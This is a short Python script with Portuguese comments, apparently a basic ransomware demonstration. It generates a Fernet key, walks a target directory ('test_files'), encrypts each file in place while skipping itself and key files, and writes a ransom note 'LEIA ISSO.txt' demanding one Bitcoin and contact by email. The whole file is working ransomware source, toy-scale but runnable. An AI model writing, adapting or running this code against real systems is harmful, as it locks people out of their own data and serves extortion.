from cryptography.fernet import Fernet
import os

# 1. Gerar chave de criptografia e salvar em um arquivo
def gerar_chave():
    chave = Fernet.generate_key()
    with open("chave.key", "wb") as chave_file:
        chave_file.write(chave)
    return chave

# 2. Carregar chave de criptografia de um arquivo
def carregar_chave():
    return open("chave.key", "rb").read()

# 3. Criptografar um arquivo
def criptografar_arquivo(arquivo, chave):
    f = Fernet(chave)
    with open(arquivo, "rb") as file:
        dados = file.read()
    dados_criptografados = f.encrypt(dados)
    with open(arquivo, "wb") as file:
        file.write(dados_criptografados)

        #4. Encontrar arquivos para criptografar
def encontrar_arquivos(diretorio):
    lista = []
    for raiz, _, arquivos in os.walk(diretorio):
        for nome in arquivos:
            caminho = os.path.join(raiz, nome)
            if nome != "ransoware.py" and not nome.endswith(".key"):
                lista.append(caminho)
    return lista

# 5. Mensagem de resgate
def mensagem_resgate():
    with open("LEIA ISSO.txt", "w") as f:
        f.write("Seus arquivos foram criptografados!\n")
        f.write("Para descriptografá-los, envie 1 Bitcoin para o endereço XYZ e envie um email para contato@exemplo.com")

        #6. Função principal
def main():
    gerar_chave()
    chave = carregar_chave()
    arquivos = encontrar_arquivos("test_files")  # Diretório alvo
    for arquivo in arquivos:
        criptografar_arquivo(arquivo, chave)
    mensagem_resgate()
    print("Todos os arquivos foram criptografados!")

if __name__ == "__main__":
    main()